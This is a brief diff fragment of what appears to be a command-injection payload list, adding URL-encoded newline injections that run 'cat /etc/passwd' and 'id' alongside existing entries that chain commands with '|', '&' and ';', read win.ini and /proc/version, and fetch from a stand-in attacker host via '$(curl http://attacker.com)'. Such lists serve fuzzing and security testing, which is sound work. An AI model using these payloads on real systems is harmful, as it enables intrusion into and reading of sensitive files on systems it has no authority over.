@@ -13,3 +13,5 @@ $(curl http://attacker.com)
 | dir
 & type C:\windows\win.ini
 ; cat /proc/version
+%0a cat /etc/passwd
+%0d%0a id
